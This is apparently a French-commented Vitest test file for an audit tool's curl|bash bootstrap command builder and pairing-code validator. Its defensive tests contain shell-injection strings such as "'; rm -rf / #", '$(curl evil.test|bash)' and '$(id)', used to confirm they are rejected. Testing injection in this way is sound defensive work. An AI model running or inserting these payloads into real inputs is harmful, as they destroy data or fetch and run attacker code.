// SPDX-FileCopyrightText: 2026 SysAudit
// SPDX-License-Identifier: LicenseRef-SysAudit-Source-Available

import { describe, expect, it } from 'vitest';
import { DIAGNOSTIC_LEVELS } from './diagnostic-levels.js';
import {
  LINK_CODE_ALPHABET,
  auditCommand,
  auditCommandUrl,
  bootstrapCommand,
  formatLinkCode,
  isValidLinkCode,
  normalizeLinkCode,
} from './audit-command.js';

const API = 'https://audit.example.be';

describe('forme des commandes', () => {
  /**
   * La non-régression qui compte : ce que voit un visiteur non connecté ne
   * change pas d'un caractère. Ces deux lignes sont celles de la documentation,
   * des captures d'écran et de ce qu'on dicte au téléphone.
   */
  it('garde la forme courte, à l’octet près, sans code ni option', () => {
    expect(auditCommand({ target: 'linux', level: 'standard' }, API)).toBe(
      `curl -fsSL ${API}/audit/l | bash`,
    );
    expect(auditCommand({ target: 'windows', level: 'standard' }, API)).toBe(
      `irm ${API}/audit/w | iex`,
    );
  });

  /**
   * Le tube ne touche jamais l'URL, quelle que soit la forme de la commande.
   *
   * Il était collé — `…/audit/l|bash`, `"…?link=SA-ABCD-EFGH"|bash` — et se
   * lisait alors comme la fin de l'adresse. Deux utilisateurs l'ont échappé pour
   * cette raison, et ce que le serveur répond ne nomme jamais la cause :
   * `curl … /audit/l\|bash` rend 404, `curl … "?link=…"\|bash` rend 400, parce
   * que `|bash` est parti dans l'URL.
   *
   * Le test porte donc sur l'**espace avant la barre**, et sur les quatre formes
   * à la fois : c'est celle qui porte un code, entre guillemets, qui a été
   * signalée en dernier, et une correction qui n'aurait tenu que sur la forme
   * courte aurait laissé le piège exactement là où il a mordu.
   */
  it('détache toujours le tube de l’adresse', () => {
    const formes = [
      auditCommand({ target: 'linux', level: 'standard' }, API),
      auditCommand({ target: 'linux', level: 'full', link: 'ABCD-EFGH' }, API),
      auditCommand({ target: 'windows', level: 'standard' }, API),
      auditCommand({ target: 'windows', level: 'standard', link: 'ABCD-EFGH' }, API),
    ];

    for (const commande of formes) {
      // Un tube collé à ce qui le précède est exactement ce qui se lit comme une
      // suite de l'adresse.
      expect(commande, commande).not.toMatch(/\S\|/);
      // Et il reste un tube : une commande qui n'en aurait plus n'exécuterait
      // rien du tout.
      expect(commande, commande).toContain(' | ');
    }
  });

  it('n’ajoute des guillemets que lorsqu’une chaîne de requête apparaît', () => {
    // `?` est un caractère de globbing : zsh refuse une URL nue avec « no
    // matches found » là où bash la laisse passer. Mais protéger une URL sans
    // `?` changerait la commande anonyme sans rien apporter.
    expect(auditCommand({ target: 'linux', level: 'standard' }, API)).not.toContain('"');
    expect(auditCommand({ target: 'linux', level: 'standard', link: 'ABCD-EFGH' }, API)).toBe(
      `curl -fsSL "${API}/audit/l?link=SA-ABCD-EFGH" | bash`,
    );
  });

  it('porte le niveau dans le chemin et le code dans la requête', () => {
    // Deux sources pour la même décision finiraient par diverger. Le niveau est
    // traduit par l'amorçage, le code est recopié par lui dans le script.
    const command = auditCommand({ target: 'linux', level: 'full', link: 'ABCD-EFGH' }, API);
    expect(command).toContain('/audit/l/f?link=SA-ABCD-EFGH');
    expect(command).not.toContain('--claim');
  });

  it('n’insère jamais un code que l’API refuserait', () => {
    for (const hostile of [
      "'; rm -rf / #",
      '$(curl evil.test|bash)',
      '`whoami`',
      'ABCD-EFGH extra',
      'OOOO-IIII',
      '',
    ]) {
      const command = auditCommand({ target: 'linux', level: 'standard', link: hostile }, API);
      expect(command, hostile).toBe(`curl -fsSL ${API}/audit/l | bash`);
    }
  });

  it('rend pour Proxmox exactement la commande Linux', () => {
    // Un nœud PVE est une Debian : c'est le scanner qui détecte seul qu'il y
    // tourne. Si les deux venaient à diverger, ce serait une décision à
    // prendre, pas un effet de bord à découvrir.
    for (const level of DIAGNOSTIC_LEVELS) {
      expect(auditCommand({ target: 'proxmox', level }, API)).toBe(
        auditCommand({ target: 'linux', level }, API),
      );
    }
  });

  it('ne double jamais la barre oblique de l’adresse', () => {
    expect(auditCommandUrl({ target: 'linux', level: 'standard' }, `${API}///`)).toBe(
      `${API}/audit/l`,
    );
  });

  it('laisse `bootstrapCommand` produire exactement la forme courte', () => {
    for (const level of DIAGNOSTIC_LEVELS) {
      expect(bootstrapCommand('linux', API, level)).toBe(
        auditCommand({ target: 'linux', level }, API),
      );
      expect(bootstrapCommand('windows', API, level)).toBe(
        auditCommand({ target: 'windows', level }, API),
      );
    }
  });

  it('combine code de liaison et options sans en perdre', () => {
    const command = auditCommand(
      { target: 'linux', level: 'standard', link: 'ABCD-EFGH', publish: true, skip: ['software'] },
      API,
    );
    expect(command).toContain('?link=SA-ABCD-EFGH');
    expect(command).toContain('bash -s -- --skip software --public');
  });
});

describe('codes de liaison', () => {
  it('tolère casse, séparateurs et préfixe', () => {
    for (const value of [
      'ABCD-EFGH',
      'abcd-efgh',
      'ABCDEFGH',
      'abcd efgh',
      'SA-ABCD-EFGH',
      'sa-abcdefgh',
    ]) {
      expect(isValidLinkCode(value), value).toBe(true);
      expect(normalizeLinkCode(value), value).toBe('ABCD-EFGH');
    }
  });

  it('sépare la forme stockée de la forme affichée', () => {
    // Le préfixe est de l'habillage : le faire entrer dans l'empreinte stockée
    // ferait dépendre une comparaison de sécurité d'un choix de présentation.
    expect(normalizeLinkCode('SA-ABCD-EFGH')).toBe('ABCD-EFGH');
    expect(formatLinkCode('abcdefgh')).toBe('SA-ABCD-EFGH');
    expect(formatLinkCode('')).toBe('');
  });

  it('refuse les caractères que l’alphabet exclut', () => {
    // `0`, `O`, `1`, `I` et `L` en sont absents : ils se confondent à la
    // lecture, et un code recopié de travers ressemble à une usurpation.
    for (const excluded of ['0', 'O', '1', 'I', 'L']) {
      expect(LINK_CODE_ALPHABET).not.toContain(excluded);
      expect(isValidLinkCode(`${excluded}BCD-EFGH`), excluded).toBe(false);
    }
  });

  it('refuse toute longueur autre que huit', () => {
    for (const value of ['ABC-EFGH', 'ABCD-EFGHJ', '', 'SA-ABCD-EFGHJ']) {
      expect(isValidLinkCode(value), value).toBe(false);
    }
  });

  it('refuse ce qui ressemble à une injection de shell', () => {
    for (const hostile of ["ABCD'-EFGH0", '$(id)', 'ABCD-EFGH`whoami`', 'ABCD-EFGH; rm -rf /']) {
      expect(isValidLinkCode(hostile), hostile).toBe(false);
    }
  });

  /**
   * La garantie qui protège réellement le script d'amorçage.
   *
   * La validation tolère les séparateurs — `ABCD;EFGH` est donc *accepté*,
   * puisque seuls les huit caractères comptent. Ce qui rend la chose sûre n'est
   * pas ce refus-là, mais le fait que la valeur émise soit toujours
   * **reconstruite** à partir de l'alphabet, jamais recopiée de l'entrée. Aucun
   * caractère de l'entrée ne peut donc atteindre le script, qui s'exécute en
   * root.
   */
  it('n’émet jamais un caractère venu de l’entrée', () => {
    const canonical =
      /^SA-[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{4}-[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{4}$/;
    for (const value of ['ABCD;EFGH', 'abcd|efgh', 'AB CD-EF GH', "ABCD'EFGH"]) {
      if (!isValidLinkCode(value)) continue;
      expect(formatLinkCode(value), value).toMatch(canonical);
      expect(auditCommandUrl({ target: 'linux', level: 'standard', link: value }, API)).toBe(
        `${API}/audit/l?link=${formatLinkCode(value)}`,
      );
    }
  });

  it('accepte les espaces autour d’un code par ailleurs correct', () => {
    // Un code recopié depuis une page web emporte souvent une espace : la
    // saisie est correcte, la refuser serait pinailler.
    expect(isValidLinkCode('  ABCD-EFGH  ')).toBe(true);
  });
});
